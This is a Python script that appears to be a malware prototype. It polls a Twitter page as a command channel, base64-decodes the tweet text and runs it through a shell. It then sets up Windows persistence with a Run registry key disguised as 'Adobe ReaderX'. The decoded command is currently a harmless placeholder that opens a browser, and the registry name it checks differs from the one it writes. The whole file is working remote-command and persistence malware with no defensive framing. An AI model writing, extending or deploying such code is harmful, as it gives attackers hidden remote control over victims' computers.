from bs4 import BeautifulSoup as mySoup
from urllib.request import urlopen
import base64, os, requests, subprocess, time
import winreg

def decode():
    lastTweet = ''
    while True:
        result = urlopen("https://twitter.com/****")
        soup = mySoup(result,"html.parser")
        tweets = soup.findAll('li',{"class":'js-stream-item'})
        for tweet in tweets:
            if tweet.find('p',{"class":'tweet-text'}):
                text = 'c3RhcnQgSWV4cGxvcmUuZXhlICJ3d3cuZ29vZ2xlLmZyIg==' #str(tweet.find('p',{"class":'tweet-text'}).get_text())
                if(text != lastTweet):
                    lastTweet = text
                    payload = base64.b64decode(text.encode("utf-8")).decode("utf-8")
                    output = subprocess.Popen(payload, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    outBytes = output.stdout.read() + output.stderr.read()
                    outStr = str(outBytes, "latin1")
                    break
        break #time.sleep(10)
    return payload

def autorun(tempdir, payloadFile, run):
    fileName = "file.txt"
    filee = open(fileName, "w")
    filee.write(payloadFile)
    filee.close()
    #os.system('copy %s %s'%(fileName, tempdir))
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, run)
    runkey = []
    try:
        i = 0
        while True:
            subkey = winreg.EnumValue(key, i)
            runkey.append(subkey[0])
            i += 1
    except WindowsError:
        pass
    # If the autorun key "Adobe ReaderX" isn't set this will set the key:
    if 'Adobe ReaderX' not in runkey:
        try:
            key= winreg.OpenKey(winreg.HKEY_CURRENT_USER, run,0,winreg.KEY_ALL_ACCESS)
            winreg.SetValueEx(key,'Adobe_ReaderX',0,winreg.REG_SZ,tempdir)
            key.Close()
        except WindowsError:
            pass

def main():
    fileName = "file.txt"
    tempdir = os.getcwd()+"\\"+fileName
    run = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
    payload = decode()
    print("PAY : ",payload)
    autorun(tempdir, payload, run)

main()
